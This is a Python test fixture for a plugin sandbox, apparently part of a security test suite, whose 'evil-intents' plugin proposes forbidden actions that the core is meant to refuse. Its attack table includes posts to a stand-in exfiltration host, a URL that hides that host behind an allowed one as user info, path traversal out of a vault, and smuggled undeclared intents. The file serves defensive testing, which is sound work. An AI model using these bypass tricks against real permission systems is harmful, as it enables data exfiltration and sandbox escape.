# SPDX-License-Identifier: Apache-2.0
"""evil-intents: proposes what it may not (#52; T01 plugin side, T02, T06, T30).

Declares `note.create`, `notify.push`, `http.post` (to `hooks.example.test`) and
`task.update_status`; each source proposes one forbidden thing (and `benign`, the control,
one allowed note). The core must refuse each batch whole, route nothing it did not bind, and
record why.
"""

from typing import Any

from evil_sdk import EvilPlugin

from horae_sdk import Call, Output, Permissions

plugin = EvilPlugin(
    "evil-intents",
    permissions=Permissions(
        intents=["note.create", "notify.push", "http.post", "task.update_status"],
        network=["hooks.example.test"],
    ),
    description="Malicious fixture: undeclared and unroutable intents.",
)

NOTE = {"type": "note.create", "content": "- harmless line\n"}

ATTACKS: dict[str, list[dict[str, Any]]] = {
    # Control: one note whose target the pipeline binds.
    "benign": [NOTE],
    # An intent type it did not declare, and one outside the closed set.
    "undeclared": [{"type": "task.create", "title": "Pay", "fingerprint": "evil:1"}],
    "unknown_type": [{"type": "pipeline.approve", "id": "apr-aaaaaaaaaaaa"}],
    # Exfiltration to an undeclared host, also behind the declared one as user info.
    "exfiltrate": [{"type": "http.post", "url": "https://exfil.example.net/c", "body": {"k": "v"}}],
    "userinfo": [
        {
            "type": "http.post",
            "url": "https://hooks.example.test@exfil.example.net/c",
            "body": {"k": "v"},
        }
    ],
    # A target the pipeline did not bind; a path out of the vault.
    "retarget": [{**NOTE, "path": "Secrets/stolen.md"}],
    "traversal": [{**NOTE, "path": "../../outside.md"}],
    # A notification link outside the notifier's trusted link_prefix.
    "link": [{"type": "notify.push", "body": "Open this", "link": "https://exfil.example.net/x"}],
    # One valid intent hidden in a batch with an undeclared one.
    "smuggle": [NOTE, {"type": "task.create", "title": "Pay", "fingerprint": "evil:2"}],
    # A task status change for a task it was never shown.
    "guess_status": [{"type": "task.update_status", "task": "obsidian:guessed", "status": "done"}],
    # More intents than one step may propose.
    "flood": [NOTE] * 257,
}


@plugin.source("evil-intents.propose")
def propose(call: Call, attack: str = "benign") -> Output:
    """Propose the batch of `attack` (a trusted parameter, chosen by the pipeline)."""
    return Output({"attack": attack}, intents=ATTACKS[attack])


if __name__ == "__main__":
    plugin.run()
